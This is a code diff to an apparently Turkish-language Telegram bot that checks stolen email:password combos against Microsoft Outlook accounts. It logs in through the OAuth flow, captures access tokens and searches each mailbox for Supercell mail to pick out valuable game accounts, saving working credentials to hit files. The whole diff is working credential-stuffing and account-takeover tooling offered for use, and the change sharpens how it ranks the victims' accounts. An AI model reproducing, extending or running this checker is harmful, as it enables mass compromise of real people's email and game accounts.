@@ -3,6 +3,8 @@ from urllib.parse import urlparse, parse_qs
 import urllib3
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
+from email.utils import parsedate_to_datetime
+from datetime import datetime
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -138,7 +140,8 @@ class marazali:
                 "Accept-Language": "en-US,en;q=0.9",
                 "Connection": "close"
             }
-            r2 = self.s.post(urlPost, data=data, headers=h2, allow_redirects=True, timeout=self.REQ, verify=False)
+            r2 = self.s.post(urlPost, data=data, headers=h2,
+                             allow_redirects=True, timeout=self.REQ, verify=False)
             if "#" in r2.url and r2.url != self.sahteparantezleracmasakin:
                 token = parse_qs(urlparse(r2.url).fragment).get("access_token", ["None"])[0]
                 if token != "None":
@@ -153,10 +156,12 @@ class marazali:
                         dota2mioynuyoz = {"ipt": kotukardesim.group(), "pprid": oyleeeemi.group(), "uaid": hmmm.group()}
                         action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r2.text)
                         if action:
-                            ret = self.s.post(action.group(), data=dota2mioynuyoz, allow_redirects=True, timeout=self.REQ, verify=False)
+                            ret = self.s.post(action.group(), data=dota2mioynuyoz,
+                                              allow_redirects=True, timeout=self.REQ, verify=False)
                             kurmancihergulee = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                             if kurmancihergulee:
-                                fin = self.s.get(kurmancihergulee.group(), allow_redirects=True, timeout=self.REQ, verify=False)
+                                fin = self.s.get(kurmancihergulee.group(), allow_redirects=True,
+                                                 timeout=self.REQ, verify=False)
                                 token = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
                                 if token != "None":
                                     self.gelsinhayatbildigigibi = token
@@ -233,7 +238,8 @@ class marazali:
         except:
             return False
 
-    def search(self, tag, query, token):
+    def search_supercell_messages(self, tag, token):
+        """Supercell mesajlarını say ve son tarihi bul"""
         try:
             url = "https://outlook.live.com/search/api/v2/query"
             params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
@@ -250,15 +256,15 @@ class marazali:
                         {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                     ]},
                     "From": 0,
-                    "Query": {"QueryString": query},
+                    "Query": {"QueryString": "Supercell"},
                     "RefiningQueries": None,
-                    "Size": 25,
+                    "Size": 500,
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                     "EnableTopResults": True,
                     "TopResultsCount": 3
                 }],
                 "AnswerEntityRequests": [{
-                    "Query": {"QueryString": query},
+                    "Query": {"QueryString": "Supercell"},
                     "EntityTypes": ["Event", "File"],
                     "From": 0,
                     "Size": 10,
@@ -280,25 +286,44 @@ class marazali:
                 "Content-Type": "application/json",
             }
             r = self.s.post(url, params=params, headers=h, json=body, timeout=self.REQ, verify=False)
+            
             if r.status_code == 200:
-                try:
-                    data = r.json()
-                    total = 0
-                    intikam = data.get("EntitySets", [])
-                    for es in intikam:
-                        if es.get("Total") is not None:
-                            total = es.get("Total", 0)
-                            break
-                    if total == 0:
-                        idammmmedin = re.search(r'"Total":\s*(\d+)', r.text)
-                        if idammmmedin:
-                            total = int(idammmmedin.group(1))
-                    return total
-                except:
-                    return 0
-            return 0
+                data = r.json()
+                
+                total = 0
+                son_tarih = None
+                
+                # Toplam mesaj sayısını bul
+                for es in data.get("EntitySets", []):
+                    if es.get("Total") is not None:
+                        total = es.get("Total", 0)
+                        break
+                
+                # Son mesaj tarihini bul
+                for es in data.get("EntitySets", []):
+                    results = es.get("Results", [])
+                    if results:
+                        # İlk sonuç en güncel olan
+                        first_result = results[0]
+                        date_str = first_result.get("DateTimeReceived") or first_result.get("DateTimeLastModified")
+                        if date_str:
+                            try:
+                                son_tarih = parsedate_to_datetime(date_str)
+                            except:
+                                pass
+                        break
+                
+                if total == 0:
+                    # Alternatif: regex ile ara
+                    total_match = re.search(r'"Total":\s*(\d+)', r.text)
+                    if total_match:
+                        total = int(total_match.group(1))
+                
+                return total, son_tarih
+            
+            return 0, None
         except:
-            return 0
+            return 0, None
 
     def check(self, tag):
         status = self.nihathatipoglu(tag)
@@ -308,20 +333,20 @@ class marazali:
         token = self.kimseyisevemem(tag)
         if not token:
             return "BAD", None
+        
         time.sleep(2)
-        unuturumbelki = self.search(tag, "Supercell", token)
-        games = {}
-        if unuturumbelki > 0:
-            games["Supercell"] = unuturumbelki
-            time.sleep(1)
-            games["Clash Royale"] = self.search(tag, "Clash Royale", token)
-            time.sleep(1)
-            games["Brawl Stars"] = self.search(tag, "Brawl Stars", token)
-            time.sleep(1)
-            games["Hay Day"] = self.search(tag, "Hay Day", token)
-            time.sleep(1)
-            games["Clash of Clans"] = self.search(tag, "Clash of Clans", token)
-        return "SUCCESS", games
+        
+        # Supercell mesajlarını say
+        mesaj_sayisi, son_tarih = self.search_supercell_messages(tag, token)
+        
+        supercell_info = None
+        if mesaj_sayisi > 0:
+            supercell_info = {
+                'mesaj_sayisi': mesaj_sayisi,
+                'son_tarih': son_tarih.strftime('%Y-%m-%d %H:%M:%S') if son_tarih else 'N/A'
+            }
+        
+        return "SUCCESS", supercell_info
 
 def send_message(chat_id, text, reply_markup=None):
     try:
@@ -363,7 +388,7 @@ def ana_menu(chat_id):
             [{"text": "📊 Durum", "callback_data": "durum"}]
         ]
     }
-    send_message(chat_id, "🤖 <b>Supercell Checker Bot</b>\n\nSeçenek seç:", keyboard)
+    send_message(chat_id, "🤖 <b>Supercell Mesaj Checker Bot</b>\n\nSeçenek seç:", keyboard)
 
 def thread_menu(chat_id):
     global THREAD_COUNT
@@ -410,25 +435,24 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             email, password = combo.split(":", 1)
             tag = email.split("@")[0][:12]
             c = marazali(email, password, None)
-            status, games = c.check(tag)
+            status, supercell_info = c.check(tag)
             with lock:
                 if status == "SUCCESS":
                     egriegri["hit"] += 1
-                    if games and games.get("Supercell", 0) > 0:
+                    if supercell_info:
                         egriegri["supercell_hits"] += 1
-                        lidyamanifest = []
-                        for g, count in games.items():
-                            if g != "Supercell" and count > 0:
-                                lidyamanifest.append(f"{g}=✅")
-                        gline = " | ".join(lidyamanifest) if lidyamanifest else "SC-ID"
-                        esrefftek = f"{combo} | Supercell=✅ | {gline}"
+                        mesaj_sayisi = supercell_info.get('mesaj_sayisi', 0)
+                        son_tarih = supercell_info.get('son_tarih', 'N/A')
+                        
+                        esrefftek = f"{combo} | Supercell Mesaj: {mesaj_sayisi} | Son Mesaj: {son_tarih}"
+                        
                         with open(SUPERCELL_HITS_FILE, 'a', encoding='utf-8') as f:
                             f.write(esrefftek + "\n")
                         with open(HITS_FILE, 'a', encoding='utf-8') as f:
                             f.write(esrefftek + "\n")
-                        print(f"✅ HİT {esrefftek}", flush=True)
+                        print(f"✅ SUPERCELL {esrefftek}", flush=True)
                     else:
-                        esrefftek = f"{combo} | Oyun bulunamadı ❌"
+                        esrefftek = f"{combo} | Supercell Mesaj: 0"
                         with open(HITS_FILE, 'a', encoding='utf-8') as f:
                             f.write(esrefftek + "\n")
                         print(f"✅ HİT {esrefftek}", flush=True)
@@ -475,7 +499,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 f"📊 İlerleme: {checked}/{total} (%{yuzde:.1f})\n"
                 f"{bar}\n\n"
                 f"✅ HIT: {hit}\n"
-                f"🎮 SUPERCELL: {sc}\n"
+                f"📩 SUPERCELL MESAJLI: {sc}\n"
                 f"🔐 2FA: {twofa}\n"
                 f"❌ BAD: {bad}\n"
                 f"⚠️ HATA: {errors}\n\n"
@@ -511,7 +535,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
         f"{'⏹️ Tarama durduruldu' if durdu else '✅ Tarama tamamlandı'} ({elapsed:.1f} sn)\n\n"
         f"🔱 Toplam: {dogrudogru}\n"
         f"✅ Hit: {egriegri['hit']}\n"
-        f"🎮 Supercell: {egriegri['supercell_hits']}\n"
+        f"📩 Supercell Mesajlı: {egriegri['supercell_hits']}\n"
         f"❌ Bad: {egriegri['bad']}\n"
         f"🔐 2FA: {egriegri['twofa']}\n"
         f"⚠️ Hata: {egriegri['errors']}"
